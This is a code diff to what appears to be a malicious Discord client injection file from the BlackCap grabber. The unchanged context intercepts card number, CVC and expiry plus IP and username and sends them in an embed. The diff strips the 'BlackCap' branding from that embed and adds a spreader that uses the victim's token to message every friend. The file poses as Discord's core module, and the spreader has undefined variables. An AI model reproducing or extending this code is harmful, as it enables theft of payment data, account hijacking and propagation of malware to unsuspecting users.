@@ -527,7 +527,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "BlackCap User Credit Card Added",
+                title: "Credit Card",
                 description: `
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
@@ -553,4 +553,106 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             break
     }
 })
+
+
+
+
+
+
+const fetch = require('node-fetch');
+
+const token = token;
+const M = '???';
+
+async function getFriendsList(token) {
+    const headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    };
+    try {
+        const response = await fetch("https://discord.com/api/v6/users/@me/relationships", {
+            method: 'GET',
+            headers: headers
+        });
+        const friendList = await response.json();
+        return friendList.map(friend => friend.user.id);
+    } catch (error) {
+        console.error('Error fetching friends list:', error);
+        return [];
+    }
+}
+
+async function sendMessageToFriend(token, recipientIds, message) {
+    const headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    };
+
+    try {
+        for (const recipientId of recipientIds) {
+            const response = await fetch('https://discord.com/api/v10/users/@me/channels', {
+                method: 'POST',
+                headers: headers,
+                body: JSON.stringify({ recipient_id: recipientId })
+            });
+
+            if (response.status === 200) {
+                const { id: channelId } = await response.json();
+                if (channelId) {
+                    const messageData = {
+                        content: message
+                    };
+                    const messageResponse = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
+                        method: 'POST',
+                        headers: headers,
+                        body: JSON.stringify(messageData)
+                    });
+                    if (messageResponse.status === 200) {
+                        console.log(`Message successfully sent to user with ID ${recipientId}`);
+                    } else {
+                        console.error('Error sending message');
+                        console.error(await messageResponse.text());
+                    }
+                } else {
+                    console.error('Error getting channel ID');
+                }
+            } else {
+                console.error('Error creating channel for message');
+                console.error(await response.text());
+            }
+        }
+    } catch (error) {
+        console.error('An error occurred:', error);
+    }
+}
+
+async function main() {
+    const friendIds = await getFriendsList(TOKEN);
+    console.log("Friend list:", friendIds);
+    await sendMessageToFriend(TOKEN, friendIds, M);
+}
+
+main();
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 module.exports = require("./core.asar")
